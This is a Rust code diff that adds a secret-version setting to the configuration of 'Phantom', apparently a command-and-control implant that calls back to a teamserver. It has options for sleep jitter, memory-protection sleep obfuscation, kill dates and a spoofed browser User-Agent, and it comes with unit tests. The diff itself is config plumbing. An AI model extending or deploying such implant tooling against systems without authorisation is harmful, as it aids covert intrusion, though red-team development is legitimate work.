@@ -12,6 +12,9 @@ pub struct PhantomConfig {
     pub callback_url: String,
     /// Optional listener init secret used for HKDF session key derivation.
     pub init_secret: Option<String>,
+    /// When set, the 1-byte secret version emitted in `DEMON_INIT` for listeners
+    /// configured with `InitSecrets = [...]`. Requires [`Self::init_secret`].
+    pub init_secret_version: Option<u8>,
     /// PEM-encoded certificate to pin for TLS connections to the teamserver.
     ///
     /// When set, only the teamserver presenting this certificate (or one signed by it) is
@@ -40,7 +43,8 @@ impl PhantomConfig {
     /// Build a configuration from command-line arguments and environment variables.
     ///
     /// Environment variables are applied first and may be overridden by flags:
-    /// `PHANTOM_CALLBACK_URL`, `PHANTOM_INIT_SECRET`, `PHANTOM_USER_AGENT`,
+    /// `PHANTOM_CALLBACK_URL`, `PHANTOM_INIT_SECRET`, `PHANTOM_INIT_SECRET_VERSION`,
+    /// `PHANTOM_USER_AGENT`,
     /// `PHANTOM_SLEEP_DELAY_MS`, `PHANTOM_SLEEP_JITTER`, `PHANTOM_KILL_DATE`,
     /// and `PHANTOM_WORKING_HOURS`.
     pub fn from_sources<I, S, J, K, V>(args: I, env: J) -> Result<Self, PhantomError>
@@ -66,6 +70,11 @@ impl PhantomConfig {
         if matches!(self.init_secret.as_deref(), Some("")) {
             return Err(PhantomError::InvalidConfig("init_secret must not be empty"));
         }
+        if self.init_secret_version.is_some() && self.init_secret.is_none() {
+            return Err(PhantomError::InvalidConfig(
+                "init_secret_version requires init_secret",
+            ));
+        }
         if self.sleep_jitter > 100 {
             return Err(PhantomError::InvalidConfig("sleep_jitter must be between 0 and 100"));
         }
@@ -79,6 +88,7 @@ impl PhantomConfig {
             "Options:\n",
             "  --callback-url URL       Teamserver callback endpoint\n",
             "  --init-secret SECRET     HKDF listener init secret\n",
+            "  --init-secret-version N  Secret version byte (0-255) for InitSecrets rotation\n",
             "  --user-agent VALUE       HTTP User-Agent header\n",
             "  --sleep-delay-ms N       Base sleep interval in milliseconds\n",
             "  --sleep-jitter N         Sleep jitter percentage (0-100)\n",
@@ -87,7 +97,8 @@ impl PhantomConfig {
             "  --sleep-mode MODE        Sleep obfuscation: plain or mprotect (default: mprotect)\n",
             "  -h, --help               Show this help text\n\n",
             "Environment:\n",
-            "  PHANTOM_CALLBACK_URL, PHANTOM_INIT_SECRET, PHANTOM_USER_AGENT,\n",
+            "  PHANTOM_CALLBACK_URL, PHANTOM_INIT_SECRET, PHANTOM_INIT_SECRET_VERSION,\n",
+            "  PHANTOM_USER_AGENT,\n",
             "  PHANTOM_SLEEP_DELAY_MS, PHANTOM_SLEEP_JITTER, PHANTOM_KILL_DATE,\n",
             "  PHANTOM_WORKING_HOURS, PHANTOM_PINNED_CERT_PEM, PHANTOM_SLEEP_MODE\n",
         )
@@ -108,6 +119,9 @@ impl PhantomConfig {
                 }
                 Some("PHANTOM_INIT_SECRET") => {
                     self.init_secret = Some(parse_os_string(value, "PHANTOM_INIT_SECRET")?);
+                }
+                Some("PHANTOM_INIT_SECRET_VERSION") => {
+                    self.init_secret_version = Some(parse_os_value(&value, "PHANTOM_INIT_SECRET_VERSION")?);
                 }
                 Some("PHANTOM_USER_AGENT") => {
                     self.user_agent = parse_os_string(value, "PHANTOM_USER_AGENT")?;
@@ -174,6 +188,9 @@ impl PhantomConfig {
             match flag {
                 "--callback-url" => self.callback_url = value,
                 "--init-secret" => self.init_secret = Some(value),
+                "--init-secret-version" => {
+                    self.init_secret_version = Some(parse_string_value(&value, flag)?);
+                }
                 "--user-agent" => self.user_agent = value,
                 "--sleep-delay-ms" => {
                     self.sleep_delay_ms = parse_string_value(&value, flag)?;
@@ -207,6 +224,7 @@ impl Default for PhantomConfig {
         Self {
             callback_url: String::from("https://127.0.0.1:40056/"),
             init_secret: None,
+            init_secret_version: None,
             pinned_cert_pem: None,
             user_agent: String::from(
                 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
@@ -272,6 +290,16 @@ mod tests {
     }
 
     #[test]
+    fn init_secret_version_without_init_secret_is_rejected() {
+        let config = PhantomConfig {
+            init_secret: None,
+            init_secret_version: Some(1),
+            ..Default::default()
+        };
+        assert!(config.validate().is_err());
+    }
+
+    #[test]
     fn from_sources_applies_environment_values() {
         let config = PhantomConfig::from_sources(
             ["phantom"],
@@ -283,6 +311,7 @@ mod tests {
                 ("PHANTOM_KILL_DATE", "1700000000"),
                 ("PHANTOM_WORKING_HOURS", "255"),
                 ("PHANTOM_INIT_SECRET", "sekrit"),
+                ("PHANTOM_INIT_SECRET_VERSION", "2"),
             ],
         )
         .expect("config");
@@ -294,6 +323,7 @@ mod tests {
         assert_eq!(config.kill_date, Some(1_700_000_000));
         assert_eq!(config.working_hours, Some(255));
         assert_eq!(config.init_secret.as_deref(), Some("sekrit"));
+        assert_eq!(config.init_secret_version, Some(2));
         assert!(config.pinned_cert_pem.is_none());
     }
 
@@ -370,6 +400,8 @@ mod tests {
         assert!(usage.contains("PHANTOM_CALLBACK_URL"));
         assert!(usage.contains("--sleep-mode"));
         assert!(usage.contains("PHANTOM_SLEEP_MODE"));
+        assert!(usage.contains("--init-secret-version"));
+        assert!(usage.contains("PHANTOM_INIT_SECRET_VERSION"));
     }
 
     #[test]
